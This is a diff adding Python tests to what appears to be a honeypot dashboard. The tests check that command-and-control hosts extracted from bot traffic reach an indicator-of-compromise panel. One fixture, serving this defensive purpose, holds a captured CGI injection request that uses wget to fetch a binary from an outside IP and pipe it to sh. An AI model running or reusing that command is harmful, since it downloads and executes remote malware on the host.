@@ -799,3 +799,55 @@ def test_js_wires_log_pager_on_page_load():
     # wireIocRows() and applyFilters().
     init_block = _JS[_JS.index('function initWire') :]
     assert 'wireIocRows(); wireLogPager(); applyFilters()' in init_block
+
+
+# ---------------------------------------------------------------------------
+# issue #520: handler-extracted C2 hosts (from bot_profile_data) surface too
+# ---------------------------------------------------------------------------
+
+
+class _FakeProfileDataStore:
+    """Store whose handler-extracted C2 hosts come from fetch_profile_c2_hosts.
+
+    The raw request scan (fetch_request_raws) returns nothing interesting, so
+    the only way ``91.92.40.118`` reaches the panel is via the merged
+    handler-extracted hosts path (issue #520).
+    """
+
+    def __init__(self, profile_hosts: list[str]) -> None:
+        self._profile_hosts = profile_hosts
+
+    def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
+        return ['GET /normal HTTP/1.1']
+
+    def fetch_profile_c2_hosts(self, since=None, limit=20000):  # noqa: ANN001, ANN002
+        return list(self._profile_hosts)
+
+
+def test_extract_c2_hosts_merges_handler_extracted_from_profile():
+    """A C2 host the Exploit-CGI handler extracted (and persisted in
+    bot_profile_data) must surface in the IoC panel even when the raw request
+    scan alone would miss it (issue #520)."""
+    store = _FakeProfileDataStore(['91.92.40.118'])
+    hosts = _dash_mod._extract_c2_hosts(store, since=None)
+    got = {h['host']: h['count'] for h in hosts}
+    assert got.get('91.92.40.118') == 1
+
+
+def test_extract_c2_hosts_profile_merged_with_raw():
+    """Handler-extracted hosts and raw-scan hosts are summed into one ranking."""
+    store = _FakeProfileDataStore(['91.92.40.118'])
+    store.fetch_request_raws = lambda since=None, limit=20000: [  # noqa: ANN001, ANN002
+        'GET /cgi-bin?x=wget http://91.92.40.118/arm -O - | sh HTTP/1.1'
+    ]
+    hosts = _dash_mod._extract_c2_hosts(store, since=None)
+    got = {h['host']: h['count'] for h in hosts}
+    assert got.get('91.92.40.118') == 2
+
+
+def test_extract_c2_hosts_profile_ignores_private_hosts():
+    store = _FakeProfileDataStore(['192.168.1.5', '91.92.40.118'])
+    hosts = _dash_mod._extract_c2_hosts(store, since=None)
+    got = {h['host']: h['count'] for h in hosts}
+    assert '192.168.1.5' not in got
+    assert got.get('91.92.40.118') == 1
